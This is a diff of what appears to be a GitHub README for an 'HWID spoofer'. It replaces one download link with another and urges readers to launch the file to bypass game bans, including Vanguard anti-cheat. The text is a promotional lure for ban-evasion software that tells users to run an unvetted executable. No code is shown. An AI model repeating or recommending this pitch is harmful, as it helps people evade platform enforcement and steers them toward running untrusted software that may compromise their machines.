@@ -28,7 +28,7 @@ In this repository, we bring you the **NEW VERSION OF HWID SPOOFER** that will e
 - **Vanguard HWID Change**
 
 ## 🌐 Explore Further
-Visit [**UNIVERSAL-HWID-SPOOFER**](https://github.com/files/uploaded/Application.zip) 🔗
+Visit [**UNIVERSAL-HWID-SPOOFER**](https://github.com/Irifjfjfj/UNIVERSAL-HWID-SPOOFER/releases) 🔗
 
 Click the link to dive into the realm of unstoppable gaming freedom. Launch the file to begin your journey towards bypassing bans and unlocking unlimited gaming potential. 🚪🔓
 
